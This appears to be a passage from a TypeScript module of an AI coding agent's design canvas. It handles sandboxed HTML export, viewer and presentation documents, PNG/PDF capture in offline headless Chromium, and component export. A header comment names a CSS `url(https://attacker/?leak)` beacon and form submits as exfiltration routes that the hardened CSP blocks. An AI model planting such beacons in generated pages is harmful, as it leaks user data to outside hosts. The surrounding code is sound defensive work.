/**
 * Mysti - AI Coding Agent
 * Copyright (c) 2025 DeepMyst Inc. All rights reserved.
 *
 * Author: Baha Abunojaim <baha@deepmyst.com>
 * Website: https://www.deepmyst.com/mysti
 *
 * This file is part of Mysti, licensed under the Apache License, Version 2.0.
 * See the LICENSE file in the project root for full license terms.
 *
 * SPDX-License-Identifier: Apache-2.0
 */

import {
  buildPageDocument,
  pageRenderMode,
  DOC_SANDBOX_INNER_CSP,
} from '../managers/CanvasSandbox';
import { emitElement } from '../canvas/doc/DocEmitter';
import { isLegacyPage } from '../canvas/pageMigration';
import { walk } from '../canvas/doc/DocNode';
import {
  CANVAS_CODE_OUTPUT_DIR,
  CANVAS_RENDER_TIMEOUT_MS,
} from '../constants';
import type { ArtifactPage, CanvasArtifact, CanvasFormatSpec } from '../types';
import type { DocNode, JsonValue } from '../canvas/doc/DocNode';

/**
 * Handoff: everything that leaves the canvas as a file or a full-screen view
 * (Plan 22 Phase 6, parity row 7).
 *
 * ## One frame builder, five consumers
 *
 * Before Phase 6 there were three ways an artboard reached a pixel — the board's
 * live frame, the export bundle's viewer, and a PNG path with no caller — and
 * they disagreed about sandboxing (`CanvasExportService.ts:128` emitted a bare
 * `<iframe>` and then handed the folder to `openExternal`) and about the CSP.
 * Now every one of them goes through the same two functions:
 *
 * - {@link buildPageDocument} (`CanvasSandbox.ts`) — the page *document*;
 * - {@link canvasFrameAttrs} / {@link buildFrameElementHtml} — the frame
 *   *element* that hosts it: `sandbox="allow-scripts"` with **no**
 *   `allow-same-origin`, in the board, the viewer, Present, and the PNG/PDF
 *   capture alike.
 *
 * ## The exported CSP is the hardened one
 *
 * Export pages carry {@link EXPORT_PAGE_CSP} — literally
 * {@link DOC_SANDBOX_INNER_CSP}, so the bundle cannot drift from the in-editor
 * frame. `'unsafe-eval'` is added back for exactly the artboards that still
 * need a compiler ({@link exportPageCsp}), and `img-src`/`font-src` deliberately
 * drop `https:`: canvas assets are content-addressed and inlined as
 * `data:`/`blob:`, so remote images are not load-bearing, while
 * `url(https://attacker/?leak)` in a model-authored page IS a working GET-beacon
 * out of an offline bundle. `form-action 'none'` closes the same exfil via a
 * scripted form submit; `base-uri 'none'` stops a `<base>` re-pointing relative
 * URLs.
 *
 * A sandboxed frame has an **opaque** origin, and an opaque-origin document may
 * not load `file:` subresources ("Not allowed to load local resource"), so each
 * exported page document is fully self-contained — the runtime is inlined as
 * script text and no `runtime/` directory is emitted.
 *
 * Everything here is pure except {@link createHtmlRenderer}, whose Playwright
 * handle is injected, so the whole module is unit-testable without a browser.
 */

export interface ExportFile {
  path: string;
  /** utf8 text, or base64 for binary (PNG/PDF). */
  content: string;
  encoding: 'utf8' | 'base64';
}

export interface ExportRuntimeFile {
  /** Source file name — ordering/diagnostics only; the bundle inlines `content`. */
  name: string;
  content: string;
}

export interface HtmlBundleOptions {
  /** Vendor + ui-primitives scripts, in load order (react, react-dom, ui-primitives). */
  headRuntime: ExportRuntimeFile[];
  /** The harness script (runs last). */
  harness: ExportRuntimeFile;
  /**
   * Babel standalone, in its own slot so it reaches ONLY the legacy artboards
   * that cannot be interpreted. Passing it inside `headRuntime` instead puts
   * 2,983,904 bytes into every page of the bundle — which is the regression
   * this slot exists to make impossible.
   */
  babel?: ExportRuntimeFile;
  /**
   * Resolve an `asset://<artifactId>/assets/<sha>.<ext>` ref to a URL the
   * standalone document can actually load — normally
   * {@link makeDataUriAssetResolver}.
   *
   * Without one, every consumer of {@link buildExportPageDocument} (the export
   * bundle, Present, PNG/PDF capture) shipped the raw `asset://` token: the
   * frame harness refuses that scheme, so the `src` prop was dropped and every
   * generated or imported image was silently missing from the only artifact
   * anyone else ever sees. Assets are inlined for the same reason the runtime
   * is — a page document has no sibling files it is allowed to load.
   */
  resolveAsset?: (ref: string) => string;
}

/**
 * CSP for an exported **page** document: the same hardened policy a
 * document-model artboard runs under in the editor. Imported, not restated —
 * a second copy of this string is exactly how the export viewer ended up
 * unsandboxed in the first place.
 */
export const EXPORT_PAGE_CSP = DOC_SANDBOX_INNER_CSP;

/**
 * CSP for an exported artboard that still needs a JSX compiler in its frame
 * (a `legacy` page). Identical to {@link EXPORT_PAGE_CSP} plus `'unsafe-eval'`,
 * which Babel's `new Function` step requires — and nothing else: a legacy page
 * gets a compiler, not a wider network surface.
 */
export const EXPORT_LEGACY_PAGE_CSP = withUnsafeEval(EXPORT_PAGE_CSP);

/**
 * The sandbox token every canvas frame carries — scripts, but never
 * `allow-same-origin`. Model-authored source must not reach the embedding
 * document's origin, its view token, or `acquireVsCodeApi`.
 */
export const CANVAS_FRAME_SANDBOX = 'allow-scripts';

/** @deprecated Use {@link CANVAS_FRAME_SANDBOX} — kept for existing importers. */
export const EXPORT_FRAME_SANDBOX = CANVAS_FRAME_SANDBOX;

/** The `<script type="application/json">` the viewer reads its deck from. */
export const VIEWER_MANIFEST_ID = '__mysti_viewer_manifest';

/** Hard cap on artboards inlined into one Present/viewer document. */
export const MAX_VIEWER_FRAMES = 200;

/** The CSP a page document should carry in an export bundle. */
export function exportPageCsp(page: ArtifactPage): string {
  return pageRenderMode(page) === 'jsx' ? EXPORT_LEGACY_PAGE_CSP : EXPORT_PAGE_CSP;
}

/**
 * The format an artboard is exported at.
 *
 * This is `effectiveFormat` (`src/webview/canvas/state.ts`) minus the view
 * state, and that omission is the point: §3.5 splits artifact state from view
 * state, so "I previewed this artboard as a phone" must never change what the
 * exported file *is*. Only `page.format` (artifact state) overrides the
 * artifact default.
 */
export function exportPageFormat(
  artifact: Pick<CanvasArtifact, 'format'>,
  page: ArtifactPage,
): CanvasFormatSpec {
  return page.format ?? artifact.format;
}

/* ────────────────────────────── the frame element ────────────────────────────── */

export interface FrameAttrOptions {
  /** Accessible name — normally the artboard title. */
  title?: string;
  width?: number;
  height?: number;
}

/**
 * The attribute set for a canvas frame, wherever it is built.
 *
 * Returned as a record rather than markup so the DOM-side consumers
 * (`board.ts`'s `createElement('iframe')`) apply the identical set the string
 * builders emit — one definition of "how an artboard is sandboxed".
 */
export function canvasFrameAttrs(opts: FrameAttrOptions = {}): Record<string, string> {
  const attrs: Record<string, string> = { sandbox: CANVAS_FRAME_SANDBOX };
  attrs.title = (opts.title ?? 'artboard').slice(0, 200);
  if (opts.width !== undefined) { attrs.width = String(frameDim(opts.width, 1440)); }
  if (opts.height !== undefined) { attrs.height = String(frameDim(opts.height, 900)); }
  return attrs;
}

export interface FrameElementOptions extends FrameAttrOptions {
  /** URL of the page document (export bundle: `pages/page-0.html`). */
  src?: string;
  /** The page document itself, for hosts with no files on disk. */
  srcdoc?: string;
  id?: string;
  className?: string;
  style?: string;
}

/** One `<iframe>`, sandboxed by construction. */
export function buildFrameElementHtml(opts: FrameElementOptions): string {
  const attrs = canvasFrameAttrs(opts);
  if (opts.id) { attrs.id = opts.id; }
  if (opts.className) { attrs.class = opts.className; }
  if (opts.style) { attrs.style = opts.style; }
  // `src`/`srcdoc` last so a caller-supplied attribute name can never displace
  // the sandbox token (records are ordered, and duplicate attributes take the
  // FIRST value in HTML — sandbox is written first and cannot be overridden).
  if (opts.src) { attrs.src = opts.src; }
  if (opts.srcdoc !== undefined) { attrs.srcdoc = opts.srcdoc; }
  const rendered = Object.entries(attrs)
    .map(([k, v]) => `${k}="${escapeAttr(v)}"`)
    .join(' ');
  return `<iframe ${rendered}></iframe>`;
}

/* ────────────────────────────── inlined assets ────────────────────────────── */

/**
 * Largest asset inlined into one standalone document, in decoded bytes.
 *
 * A cap exists because the alternative to inlining is *silence*: an asset that
 * does not fit is left as its raw `asset://` ref and is simply absent, which is
 * exactly today's behaviour for every asset. Anything past this would turn a
 * two-artboard export into a document no editor and no browser opens happily.
 */
export const MAX_INLINE_ASSET_BYTES = 8 * 1024 * 1024;

/** One artifact asset, read off disk by the host, ready to inline. */
export interface InlineAsset {
  /** The `asset://…` ref exactly as it appears in the document. */
  ref: string;
  /** File bytes, base64-encoded (`Buffer.toString('base64')`). */
  base64: string;
}

/**
 * The media types that survive the trip into a standalone document.
 *
 * **Images only**, and measured rather than assumed: the frame harness's
 * `safeUrl` accepts a `data:` URL only when it matches its image list
 * (`resources/canvas-sandbox/harness.js` `DATA_IMG_RE`) — `data:font/woff2`
 * and `data:video/mp4` are both dropped there, and the exported page CSP has
 * no `media-src` at all (`default-src 'none'`). Inlining either would ship
 * megabytes the renderer immediately throws away. `ArtifactStore` only ever
 * mints `png|jpg|svg|webp|mp4|webm|bin`, so in practice this is the whole
 * image half of that set plus the forms a hand-authored ref might use.
 */
const INLINE_ASSET_MIME: Record<string, string> = {
  png: 'image/png',
  jpg: 'image/jpeg',
  jpeg: 'image/jpeg',
  gif: 'image/gif',
  webp: 'image/webp',
  avif: 'image/avif',
  svg: 'image/svg+xml',
};

/** The media type an `asset://…` ref inlines as, or `null` if it does not. */
export function inlineAssetMime(ref: string): string | null {
  const m = /\.([A-Za-z0-9]+)$/.exec(typeof ref === 'string' ? ref : '');
  if (!m) { return null; }
  return INLINE_ASSET_MIME[m[1].toLowerCase()] ?? null;
}

/**
 * Strict base64: the resolved URI is substituted into RAW MARKUP for a legacy
 * `html` page (`rewriteAssetTokens` runs over the source), so a value carrying
 * `"` or `<` would be an attribute break-out. Bytes that are not plain base64
 * are not an asset we wrote.
 */
const BASE64_RE = /^[A-Za-z0-9+/]*={0,2}$/;
const MAX_INLINE_ASSET_B64 = Math.ceil(MAX_INLINE_ASSET_BYTES / 3) * 4;

/**
 * `asset://…` → `data:<mime>;base64,…`, for the documents that leave the editor.
 *
 * `data:` rather than a bundle-relative `assets/x.png` on purpose: the exported
 * page CSP is the hardened in-editor one, and widening its `img-src` with
 * `'self' file:` to reach sibling files would hand a model-authored page a
 * local-file probe for no gain. `img-src data:` is already there, so this needs
 * no policy change at all and works identically for the bundle, for Present and
 * for a PNG capture — none of which can rely on files being on disk.
 *
 * An unknown ref is returned unchanged, so an asset we could not read degrades
 * to exactly today's behaviour (missing image) rather than to the string
 * `"undefined"` in the middle of the document.
 */
export function makeDataUriAssetResolver(assets: readonly InlineAsset[]): (ref: string) => string {
  const byRef = new Map<string, string>();
  for (const asset of assets ?? []) {
    if (!asset || typeof asset.ref !== 'string' || typeof asset.base64 !== 'string') { continue; }
    const mime = inlineAssetMime(asset.ref);
    if (!mime) { continue; }
    if (asset.base64.length > MAX_INLINE_ASSET_B64) { continue; }
    if (!BASE64_RE.test(asset.base64)) { continue; }
    byRef.set(asset.ref, `data:${mime};base64,${asset.base64}`);
  }
  return (ref: string): string => byRef.get(ref) ?? ref;
}

/**
 * Every `asset://` ref an artifact's artboards point at — document pages and
 * `legacy` source alike, because both go through `rewriteAssetTokens`.
 */
export function collectArtifactAssetRefs(artifact: Pick<CanvasArtifact, 'pages'>): string[] {
  const refs = new Set<string>();
  for (const page of artifact?.pages ?? []) {
    if (page?.doc) {
      for (const ref of collectAssetRefs(page.doc)) { refs.add(ref); }
    }
    const legacy = page?.legacy?.source;
    if (typeof legacy === 'string') {
      for (const ref of legacy.match(ASSET_TOKEN_RE) ?? []) { refs.add(ref); }
    }
  }
  return [...refs];
}

/* ─────────────────────────────── the HTML bundle ─────────────────────────────── */

/**
 * Build a self-contained HTML bundle: `index.html` (viewer) + `pages/page-N.html`
 * (each rendered through the same sandbox builder, runtime inlined). Relative
 * paths only, so it works opened from disk or from any static host.
 */
export function exportHtmlBundle(artifact: CanvasArtifact, opts: HtmlBundleOptions): ExportFile[] {
  const pageFiles: ExportFile[] = artifact.pages.map((page, i) => ({
    path: `pages/page-${i}.html`,
    encoding: 'utf8' as const,
    content: buildExportPageDocument(artifact, page, opts),
  }));

  const frames: ViewerFrame[] = artifact.pages.map((page, i) => {
    const format = exportPageFormat(artifact, page);
    return {
      title: page.actionTitle || `Page ${i + 1}`,
      width: format.width,
      height: format.height,
      src: `pages/page-${i}.html`,
    };
  });

  return [
    {
      path: 'index.html',
      encoding: 'utf8',
      content: buildViewerDocument({ title: artifact.name, frames, layout: 'viewer' }),
    },
    ...pageFiles,
  ];
}

/** One artboard as a standalone, self-contained document. */
export function buildExportPageDocument(
  artifact: Pick<CanvasArtifact, 'format' | 'theme'>,
  page: ArtifactPage,
  opts: HtmlBundleOptions,
): string {
  return buildPageDocument({
    page,
    theme: artifact.theme,
    format: exportPageFormat(artifact, page),
    runtime: {
      headScripts: opts.headRuntime.map(f => f.content),
      babel: opts.babel?.content,
      harness: opts.harness.content,
    },
    csp: exportPageCsp(page),
    resolveAsset: opts.resolveAsset,
  });
}

/* ──────────────────────────── the viewer / Present shell ──────────────────────────── */

/** One artboard in a deck the viewer pages through. */
export interface ViewerFrame {
  title: string;
  width: number;
  height: number;
  /** Relative URL of the page document (export bundle). */
  src?: string;
  /** The page document itself (Present: nothing is on disk). */
  doc?: string;
}

export interface ViewerDocOptions {
  /** Document title — normally the design's name. */
  title: string;
  frames: ViewerFrame[];
  startIndex?: number;
  /** `viewer` = header + page list; `present` = full-bleed, chrome-free. */
  layout?: 'viewer' | 'present';
  /**
   * Some framed artboard still needs a JSX compiler. Only meaningful for
   * `doc` (srcdoc) frames: an `about:srcdoc` document inherits the embedder's
   * policy on top of its own, so without this the inherited `script-src` would
   * strip `'unsafe-eval'` back out of a legacy frame and render it blank.
   */
  allowEval?: boolean;
  /** JS expression computing the fit scale (see `CanvasPresent`). */
  fitScaleJs?: string;
  /** Padding around a Present artboard, in CSS px. */
  padding?: number;
}

/**
 * CSP for a viewer/Present document.
 *
 * `frame-src` is delivery-dependent: bundle pages are sibling files (a `file:`
 * document's origin does not match `'self'` in Chromium, so both are listed),
 * while an `about:srcdoc` frame inherits the embedder's origin and matches
 * `'self'`.
 */
export function viewerCsp(opts: { frames: 'src' | 'srcdoc' | 'mixed'; allowEval?: boolean }): string {
  const frameSrc = opts.frames === 'srcdoc' ? "'self'" : "'self' file:";
  const scriptSrc = opts.frames !== 'src' && opts.allowEval
    ? "'unsafe-inline' 'unsafe-eval'"
    : "'unsafe-inline'";
  return (
    `default-src 'none'; script-src ${scriptSrc}; style-src 'unsafe-inline'; ` +
    `img-src data: blob:; font-src data:; connect-src 'none'; frame-src ${frameSrc}; ` +
    `form-action 'none'; base-uri 'none';`
  );
}

/**
 * The exported viewer's CSP (bundle delivery). Kept as a named export because
 * the bundle's shape is asserted by tests and read by the export writer.
 */
export const EXPORT_VIEWER_CSP = viewerCsp({ frames: 'src' });

/**
 * The one deck shell: `index.html` in an export bundle and the Present view in
 * the editor are the same document with a different `layout`.
 *
 * The nav script never touches `innerHTML` — every label goes in through
 * `textContent`, and the deck itself arrives as JSON in a non-executable
 * `<script type="application/json">` block. Page titles are model-authored.
 */
export function buildViewerDocument(opts: ViewerDocOptions): string {
  const present = opts.layout === 'present';
  const frames = opts.frames.slice(0, MAX_VIEWER_FRAMES).map(sanitizeFrame);
  const kinds = new Set(frames.map(f => (f.doc !== undefined ? 'srcdoc' : 'src')));
  const delivery: 'src' | 'srcdoc' | 'mixed' =
    kinds.size > 1 ? 'mixed' : kinds.has('srcdoc') ? 'srcdoc' : 'src';
  const csp = viewerCsp({ frames: delivery, allowEval: opts.allowEval });
  const start = clampIndex(opts.startIndex ?? 0, frames.length);
  const padding = Math.max(0, Math.min(400, Math.round(numberOr(opts.padding, present ? 48 : 24))));
  const first = frames[start];

  const list = present ? '' : frames.map((f, i) =>
    `<li><button type="button" data-i="${i}"${i === start ? ' class="active"' : ''}>${escapeHtml(f.title)}</button></li>`,
  ).join('');

  const frameHtml = buildFrameElementHtml({
    id: 'frame',
    title: first ? first.title : 'artboard',
    width: first ? first.width : undefined,
    height: first ? first.height : undefined,
  });

  return `<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta http-equiv="Content-Security-Policy" content="${escapeAttr(csp)}">
<title>${escapeHtml(opts.title)}</title>
<style>
${present ? presentCss(padding) : viewerCss()}
</style>
</head>
<body class="${present ? 'present' : 'viewer'}">
${present ? presentBody(frameHtml) : viewerBody(opts.title, list, frameHtml)}
<script type="application/json" id="${VIEWER_MANIFEST_ID}">${jsonForScript(frames)}</script>
<script>
${viewerScript({ present, start, padding, fitScaleJs: opts.fitScaleJs })}
</script>
</body>
</html>`;
}

function viewerCss(): string {
  return `:root { color-scheme: light dark; }
* { box-sizing: border-box; }
html, body { height: 100%; margin: 0; font-family: system-ui, sans-serif; }
.app { display: grid; grid-template-columns: 240px 1fr; grid-template-rows: 48px 1fr; height: 100vh; }
header { grid-column: 1 / -1; display: flex; align-items: center; padding: 0 16px; border-bottom: 1px solid #8884; font-weight: 600; }
nav { border-right: 1px solid #8884; overflow: auto; padding: 8px; }
nav ul { list-style: none; margin: 0; padding: 0; }
nav button { width: 100%; text-align: left; padding: 8px 10px; border: 0; background: transparent; border-radius: 6px; cursor: pointer; font: inherit; color: inherit; }
nav button:hover { background: #8882; }
nav button.active { background: #2563EB22; color: #2563EB; font-weight: 600; }
main { overflow: auto; display: flex; justify-content: center; align-items: flex-start; padding: 24px; background: #8881; }
iframe { border: 0; background: #fff; box-shadow: 0 10px 40px #0006; border-radius: 8px; }`;
}

function presentCss(padding: number): string {
  return `:root { color-scheme: dark; }
* { box-sizing: border-box; }
html, body { height: 100%; margin: 0; background: #0b0b0d; color: #e7e7ea; font-family: system-ui, sans-serif; overflow: hidden; }
.stage { position: fixed; inset: 0; display: flex; align-items: center; justify-content: center; padding: ${padding}px; }
.scaler { transform-origin: center center; will-change: transform; }
iframe { border: 0; background: #fff; box-shadow: 0 20px 80px #000a; border-radius: 4px; display: block; }
.hud { position: fixed; left: 0; right: 0; bottom: 14px; display: flex; gap: 12px; align-items: center; justify-content: center; font-size: 12px; opacity: .55; pointer-events: none; }
.hud .title { max-width: 46vw; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }`;
}

function viewerBody(title: string, list: string, frame: string): string {
  return `  <div class="app">
    <header>${escapeHtml(title)}</header>
    <nav><ul>${list}</ul></nav>
    <main>${frame}</main>
  </div>`;
}

function presentBody(frame: string): string {
  return `  <div class="stage"><div class="scaler" id="scaler">${frame}</div></div>
  <div class="hud"><span class="title" id="hud-title"></span><span id="hud-count"></span></div>`;
}

/**
 * The deck's paging script. Self-contained, no host messaging: the same text
 * runs from `file:` in an exported bundle and inside a webview panel.
 */
function viewerScript(opts: {
  present: boolean;
  start: number;
  padding: number;
  fitScaleJs?: string;
}): string {
  const fit = opts.fitScaleJs && /^[\w\s().,/*+-]{1,200}$/.test(opts.fitScaleJs)
    ? opts.fitScaleJs
    : 'Math.max(min, Math.min(max, Math.min(vw / w, vh / h)))';
  return `(function () {
  var raw = document.getElementById('${VIEWER_MANIFEST_ID}');
  var deck = [];
  try { deck = JSON.parse(raw.textContent || '[]'); } catch (e) { deck = []; }
  var frame = document.getElementById('frame');
  var present = ${opts.present ? 'true' : 'false'};
  var PAD = ${opts.padding};
  var i = ${opts.start};
  var btns = Array.prototype.slice.call(document.querySelectorAll('nav button'));
  var scaler = document.getElementById('scaler');
  var hudTitle = document.getElementById('hud-title');
  var hudCount = document.getElementById('hud-count');

  function scaleFor(w, h) {
    var vw = Math.max(1, window.innerWidth - PAD * 2);
    var vh = Math.max(1, window.innerHeight - PAD * 2);
    var min = 0.05, max = 2;
    return ${fit};
  }

  function layout() {
    var item = deck[i];
    if (!item || !scaler) { return; }
    scaler.style.transform = 'scale(' + scaleFor(item.width, item.height) + ')';
  }

  function show(n) {
    if (!deck.length) { return; }
    i = Math.max(0, Math.min(deck.length - 1, n));
    var item = deck[i];
    frame.setAttribute('title', item.title);
    frame.setAttribute('width', String(item.width));
    frame.setAttribute('height', String(item.height));
    if (typeof item.doc === 'string') { frame.srcdoc = item.doc; }
    else if (item.src) { frame.removeAttribute('srcdoc'); frame.src = item.src; }
    for (var b = 0; b < btns.length; b++) {
      if (btns[b].className === 'active') { btns[b].className = ''; }
    }
    if (btns[i]) { btns[i].className = 'active'; }
    if (hudTitle) { hudTitle.textContent = item.title; }
    if (hudCount) { hudCount.textContent = (i + 1) + ' / ' + deck.length; }
    layout();
  }

  for (var k = 0; k < btns.length; k++) {
    (function (btn) {
      btn.addEventListener('click', function () { show(parseInt(btn.getAttribute('data-i'), 10) || 0); });
    })(btns[k]);
  }

  document.addEventListener('keydown', function (e) {
    if (e.key === 'ArrowRight' || e.key === 'ArrowDown' || e.key === 'PageDown' || e.key === ' ') { e.preventDefault(); show(i + 1); }
    else if (e.key === 'ArrowLeft' || e.key === 'ArrowUp' || e.key === 'PageUp') { e.preventDefault(); show(i - 1); }
    else if (e.key === 'Home') { show(0); }
    else if (e.key === 'End') { show(deck.length - 1); }
  });
  if (present) { window.addEventListener('resize', layout); }
  show(i);
})();`;
}

/* ────────────────────────────── PNG / PDF capture ────────────────────────────── */

export type CapturePng = (html: string, dims: { width: number; height: number }) => Promise<string>;
export type CapturePdf = CapturePng;

/** Export each artboard to a PNG via an injected Playwright capture. */
export async function exportPng(
  artifact: CanvasArtifact,
  opts: HtmlBundleOptions & { capture: CapturePng },
): Promise<ExportFile[]> {
  return capturePages(artifact, opts, opts.capture, 'png');
}

/**
 * Export each artboard to a PDF via an injected Playwright capture.
 *
 * One file per artboard, not one stitched document: Chromium's `page.pdf()`
 * renders exactly one loaded page, and stitching would need a PDF library this
 * project does not ship. `page-0.pdf`, `page-1.pdf`, … mirrors the PNG shape,
 * and each file is the artboard at its own device size.
 */
export async function exportPdf(
  artifact: CanvasArtifact,
  opts: HtmlBundleOptions & { capture: CapturePdf },
): Promise<ExportFile[]> {
  return capturePages(artifact, opts, opts.capture, 'pdf');
}

async function capturePages(
  artifact: CanvasArtifact,
  opts: HtmlBundleOptions,
  capture: CapturePng,
  ext: 'png' | 'pdf',
): Promise<ExportFile[]> {
  const out: ExportFile[] = [];
  for (let i = 0; i < artifact.pages.length; i++) {
    const page = artifact.pages[i];
    const html = buildExportPageDocument(artifact, page, opts);
    const format = exportPageFormat(artifact, page);
    const data = await capture(html, { width: format.width, height: format.height });
    out.push({ path: `page-${i}.${ext}`, content: data, encoding: 'base64' });
  }
  return out;
}

/* eslint-disable @typescript-eslint/no-explicit-any */
/** Playwright is an optional runtime dependency, resolved through BrowserManager. */
type AnyPw = any;

/**
 * The module seam: `BrowserManager.ensurePlaywright()` satisfies this
 * structurally, so the renderer reuses the one place that knows how to resolve
 * the optional dependency instead of `require`-ing it a second time.
 */
export interface PlaywrightLoader {
  ensurePlaywright(): Promise<AnyPw>;
}

export interface HtmlRendererOptions {
  /** PNG pixel density. 2 = retina, matching the old `exportPng` docstring. */
  deviceScaleFactor?: number;
  /** Milliseconds allowed for one document to load. */
  timeoutMs?: number;
  /** Settle delay after load, for fonts/layout. */
  settleMs?: number;
}

export interface HtmlRenderer {
  capturePng: CapturePng;
  capturePdf: CapturePdf;
  /** Idempotent. */
  close(): Promise<void>;
}

/** Requests a capture page may make at all — everything else is aborted. */
const OFFLINE_SCHEMES = ['data:', 'blob:', 'about:'];

/**
 * Render self-contained page documents to PNG/PDF with headless Chromium.
 *
 * The renderer that `CanvasPreviewService` was written against and never got
 * ("BrowserManager cannot render an HTML string"). Three properties matter:
 *
 * 1. **Offline by construction.** Every request the capture page makes is
 *    aborted unless it is `data:`/`blob:`/`about:`. The document's CSP already
 *    forbids network, but a capture renders MODEL-AUTHORED content with a real
 *    browser engine — the route filter is the layer that does not depend on the
 *    page's own `<meta>` surviving.
 * 2. **No navigation.** `setContent` only; nothing is written to disk and no
 *    URL is ever loaded, so there is no origin to leak into.
 * 3. **Nothing leaks.** The browser is launched once and reused; every capture
 *    closes its own context even when the capture throws.
 */
export function createHtmlRenderer(
  loader: PlaywrightLoader,
  opts: HtmlRendererOptions = {},
): HtmlRenderer {
  const deviceScaleFactor = clampNumber(opts.deviceScaleFactor, 1, 4, 2);
  const timeout = clampNumber(opts.timeoutMs, 1000, 600_000, CANVAS_RENDER_TIMEOUT_MS);
  const settleMs = clampNumber(opts.settleMs, 0, 10_000, 150);

  let browser: AnyPw = null;
  let launching: Promise<AnyPw> | null = null;
  let closed = false;

  async function ensureBrowser(): Promise<AnyPw> {
    if (closed) { throw new Error('[Mysti] canvas renderer is closed'); }
    if (browser) { return browser; }
    if (!launching) {
      launching = (async () => {
        const pw = await loader.ensurePlaywright();
        const type = pw?.chromium;
        if (!type || typeof type.launch !== 'function') {
          throw new Error('[Mysti] canvas export needs Chromium — run: npx playwright install chromium');
        }
        return type.launch({ headless: true });
      })();
      launching.catch(() => { launching = null; });
    }
    const launched = await launching;
    if (closed) {
      await launched.close?.().catch(() => undefined);
      throw new Error('[Mysti] canvas renderer is closed');
    }
    browser = launched;
    return browser;
  }

  async function render(
    html: string,
    dims: { width: number; height: number },
    mode: 'png' | 'pdf',
  ): Promise<string> {
    const width = frameDim(dims.width, 1440);
    const height = frameDim(dims.height, 900);
    const b = await ensureBrowser();
    const context = await b.newContext({
      viewport: { width, height },
      deviceScaleFactor: mode === 'png' ? deviceScaleFactor : 1,
      acceptDownloads: false,
    });
    try {
      await context.route('**/*', (route: AnyPw) => {
        const url = String(route.request?.().url?.() ?? '');
        if (OFFLINE_SCHEMES.some(s => url.startsWith(s))) { return route.continue(); }
        return route.abort('blockedbyclient');
      });
      const page = await context.newPage();
      await page.setContent(html, { waitUntil: 'load', timeout });
      if (settleMs > 0 && typeof page.waitForTimeout === 'function') {
        await page.waitForTimeout(settleMs);
      }
      const buffer = mode === 'png'
        ? await page.screenshot({ type: 'png', fullPage: true })
        : await page.pdf({
          width: `${width}px`,
          height: `${height}px`,
          printBackground: true,
          pageRanges: '1',
        });
      return toBase64(buffer);
    } finally {
      await context.close?.().catch(() => undefined);
    }
  }

  return {
    capturePng: (html, dims) => render(html, dims, 'png'),
    capturePdf: (html, dims) => render(html, dims, 'pdf'),
    async close(): Promise<void> {
      closed = true;
      const b = browser;
      browser = null;
      launching = null;
      if (b) { await b.close?.().catch(() => undefined); }
    },
  };
}
/* eslint-enable @typescript-eslint/no-explicit-any */

/* ─────────────────────────── design → code handoff ─────────────────────────── */

/**
 * A component file, ready for the **gated** write path.
 *
 * This is the one export that leaves `.mysti/canvas/` — so per §3.6 ("no new
 * shell path", "capabilities up, authority unchanged") it is deliberately NOT a
 * canvas op. The canvas authority class covers `.mysti/canvas/<id>/` and
 * nothing else; writing into `src/` crosses that boundary and therefore goes
 * through `MystiLocalExec.write(relPath, content, ctx)`, whose gate shows the
 * user the exact path before a byte is written. This function builds the
 * payload and nothing else: it does not touch the filesystem, and there is no
 * code path from here to a shell.
 */
export interface ComponentExportPlan {
  /** Workspace-relative POSIX path — the `relPath` argument to `MystiLocalExec.write`. */
  relPath: string;
  content: string;
  componentName: string;
  /** `asset://` refs the component still points at; the caller must resolve them. */
  assetRefs: string[];
  /** The component renders `UI.*` primitives and needs the import to resolve. */
  usesUiPrimitives: boolean;
  /** Non-fatal notes to show next to the permission card. */
  warnings: string[];
}

export type ComponentExportResult =
  | { ok: true; plan: ComponentExportPlan }
  | { ok: false; error: string };

export interface ComponentExportOptions {
  /** Override the name derived from the artboard title. */
  componentName?: string;
  /** Workspace-relative directory. Defaults to `CANVAS_CODE_OUTPUT_DIR`. */
  dir?: string;
  extension?: 'tsx' | 'jsx';
  /** Module specifier providing the `UI` primitives in the user's project. */
  uiImport?: string;
}

const RESERVED_COMPONENT_NAMES = new Set(['React', 'Fragment', 'UI', 'Page']);

/**
 * "Export this artboard as a component" — the round-trip a hosted design tool
 * structurally cannot do, because `DocEmitter` already emits the real JSX the
 * canvas renders.
 */
export function buildComponentExport(
  page: ArtifactPage,
  opts: ComponentExportOptions = {},
): ComponentExportResult {
  if (isLegacyPage(page)) {
    return {
      ok: false,
      error: 'This artboard is a legacy code page — its source never compiled to a document, so there is no component to emit. Open it and fix the compile error first.',
    };
  }
  const doc = page.doc;
  if (!doc || typeof doc.tag !== 'string') {
    return { ok: false, error: 'This artboard has no document to export.' };
  }

  const componentName = componentNameFor(opts.componentName ?? page.actionTitle);
  const dir = sanitizeDir(opts.dir);
  if (dir === null) {
    return { ok: false, error: `"${opts.dir}" is not a valid output directory (relative paths inside the workspace only).` };
  }
  const ext = opts.extension === 'jsx' ? 'jsx' : 'tsx';
  const relPath = `${dir}/${componentName}.${ext}`;

  const body = emitElement(doc).split('\n').map(l => (l ? `    ${l}` : l)).join('\n');
  const usesUiPrimitives = docUsesUiPrimitives(doc);
  const assetRefs = collectAssetRefs(doc);
  const uiImport = sanitizeModuleSpecifier(opts.uiImport) ?? './canvas-ui';

  const header = [
    '/**',
    ` * ${componentName} — exported from the Mysti canvas artboard${page.actionTitle ? ` "${page.actionTitle}"` : ''}.`,
    ' *',
    ' * Generated from the artboard document. Re-exporting overwrites this file,',
    ' * so treat the canvas as the source of truth or detach it by renaming.',
    ' */',
  ].join('\n');

  const imports = usesUiPrimitives ? `import { UI } from '${uiImport}';\n\n` : '';
  const content =
    `${header}\n\n${imports}export function ${componentName}() {\n  return (\n${body}\n  );\n}\n\nexport default ${componentName};\n`;

  const warnings: string[] = [];
  if (usesUiPrimitives) {
    warnings.push(`Renders Mysti UI primitives — the import "${uiImport}" must resolve in this project.`);
  }
  if (assetRefs.length) {
    warnings.push(`References ${assetRefs.length} canvas asset(s) (asset://…) that must be copied into the project.`);
  }

  return { ok: true, plan: { relPath, content, componentName, assetRefs, usesUiPrimitives, warnings } };
}

/** `"Sign in screen" → "SignInScreen"`. Always a legal JS identifier. */
export function componentNameFor(raw: string | undefined): string {
  const words = String(raw ?? '')
    .normalize('NFKD')
    .replace(/[^A-Za-z0-9]+/g, ' ')
    .trim()
    .split(/\s+/)
    .filter(Boolean);
  let name = words.map(w => w[0].toUpperCase() + w.slice(1)).join('').slice(0, 64);
